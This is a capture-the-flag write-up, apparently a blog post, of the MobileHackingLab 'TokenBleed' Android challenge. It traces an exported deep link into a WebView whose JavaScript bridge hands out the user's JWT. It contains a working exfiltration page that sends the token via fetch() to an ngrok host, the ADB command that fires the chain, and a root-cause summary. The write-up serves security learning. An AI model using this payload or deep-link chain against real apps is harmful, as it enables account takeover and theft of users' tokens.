---
title: "TokenBleed @ MobileHackingLab"
date: 2026-06-15
categories: [Mobile Security, Intermediate]
tags: [webview, deeplink, javascript-bridge, token-theft]
image:
  path: /assets/token.png
---

## Introduction

TokenBleed is a mobile hacking lab challenge centered aroun
d a cryptocurrency 
exchange Android application. The goal is to exfiltrate a user's JWT 
authentication token remotely by exploiting a misconfigured WebView JavaScript 
bridge which simulates a real-world one-click account takeover.

---

## Recon: Manifest Analysis

I started by decompiling the APK with JADX and examining the 
`AndroidManifest.xml` to map out the attack surface.

The first thing that caught my eye was `SplashActivity` being exported with a 
custom deep link scheme:

```xml
<activity
    android:name="com.mobilehackinglab.exchange.SplashActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="mhlcrypto"/>
    </intent-filter>
</activity>
```

This means anyone can trigger the app externally using a `mhlcrypto://` link. 
I also noticed `DWebViewActivity` in the manifest. It's not exported, but 
potentially reachable through the deep link chain.

<img width="822" height="601" alt="image" src="https://github.com/user-attachments/assets/626a89c8-528f-423a-8960-2b17e08c89c0" />


---

## Tracing the Deep Link Chain

### SplashActivity

I opened `SplashActivity` in JADX next. The logic is simple, if a token 
already exists, it forwards the incoming deep link data directly to 
`MainActivity`:

```java
if (new TokenManager(applicationContext).getToken() != null) {
    intent = new Intent(this, (Class<?>) MainActivity.class);
    intent.setData(getIntent().getData());
    intent.setAction(getIntent().getAction());
}
```

No filtering, no sanitization, the deep link data passes through untouched.

### MainActivity

In `MainActivity`, I found the `handleIntent` method which processes the 
incoming deep link:

```java
if (!Intrinsics.areEqual("showPage", data2.getHost()) ||
    (queryParameter = data2.getQueryParameter("url")) == null) {
    return;
}
Intent intent2 = new Intent(this, (Class<?>) DWebViewActivity.class);
intent2.putExtra("url_to_load", queryParameter);
startActivity(intent2);
```

So a deep link like `mhlcrypto://showPage?url=https://attacker.com` would 
extract the `url` parameter and pass it straight to `DWebViewActivity`. 
No URL validation whatsoever.

<img width="1129" height="326" alt="image" src="https://github.com/user-attachments/assets/0ba0de6b-c4b2-4316-b08b-08f3359204f9" />


---

## The WebView — DWebViewActivity

Opening `DWebViewActivity` revealed the JavaScript bridge setup:

```java
activityDwebViewBinding4.dwebview.addJavascriptObject(new JsApi(this), null);
```

A `JsApi` object is exposed to JavaScript with no namespace (`null`), meaning 
any page loaded in this WebView has direct access to its methods.

The only URL check before loading is:

```java
if (stringExtra != null && StringsKt.startsWith$default(stringExtra, "http", ...))
```

It checks if the url starts with `http` — that's it. My attacker URL would pass right through.

---

## The Vulnerable JS Bridge — JsApi

This is where the vulnerability lives. I opened `JsApi` and found this method:

```java
@JavascriptInterface
public final void getUserAuth(Object args, CompletionHandler<Object> handler) {
    String token = new TokenManager(this.context).getToken();
    if (token != null) {
        handler.complete(new JSONObject(token));
    }
}
```

`getUserAuth` is exposed to JavaScript with no authentication check and no 
origin validation. Any page loaded in the WebView can call it and receive 
the JWT back.

<img width="685" height="212" alt="image" src="https://github.com/user-attachments/assets/5cd09607-a19c-44f9-bb90-9b795241617b" />


---

## Building the Exploit

### Setting Up the Attacker Infrastructure

I started a local Python HTTP server to serve my malicious page:

```bash
~> python3 -m http.server 8080
```

Then I used ngrok to get a public HTTPS URL, becuase the app blocks 
cleartext traffic (HTTP):

```bash
~> ngrok http 8080 
```

<img width="1074" height="297" alt="image" src="https://github.com/user-attachments/assets/b276954a-1248-4d44-b359-37532e810533" />


### Crafting the Malicious Page

The app uses DSBridge, so I needed to include the DSBridge JS library and 
use its `dsBridge.call()` syntax to invoke the native method:

```html
<html>
<head></head>
<body>
<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js">
</script>
<script>
    dsBridge.call("getUserAuth", {}, function(response) {
        fetch("https://f63f-105-127-12-150.ngrok-free.app?token=" + JSON.stringify(response));
    });
</script>
</body>
</html>
```

I saved this as `steal.html` in my server directory.

---

## Triggering the Exploit

With the server running and ngrok active, I first logged into the app with 
any valid credentials (the challenge doesn't require real registration), then 
fired the deep link via ADB:

```bash
~> adb shell am start -a android.intent.action.VIEW -d "mhlcrypto://showPage?url=https://f63f-105-127-12-150.ngrok-free.app/steal.html"
```

The deep link chain fired:

→ SplashActivity (token exists, forwards intent)

→ MainActivity (extracts url param)

→ DWebViewActivity (loads attacker page)

→ dsBridge.call("getUserAuth") executes

→ JWT returned and sent to my server

---

## Token Exfiltrated

Checking my Python server logs, I saw the incoming request with the JWT:


<img width="1069" height="238" alt="image" src="https://github.com/user-attachments/assets/4c7f3895-27ca-45bb-b572-99da47b3004f" />

---

## Impact

With the JWT in hand, an attacker can make authenticated API requests on 
behalf of the victim — full account takeover with a single link click. The 
victim only needs to have the app installed and be logged in.

---

## Root Cause

The vulnerability chains three issues together:

- `SplashActivity` forwards deep link data to `MainActivity` without 
validation
- `MainActivity` passes the `url` parameter to `DWebViewActivity` with no 
allowlist
- `JsApi.getUserAuth()` returns the JWT to any JavaScript caller with no 
origin check

---

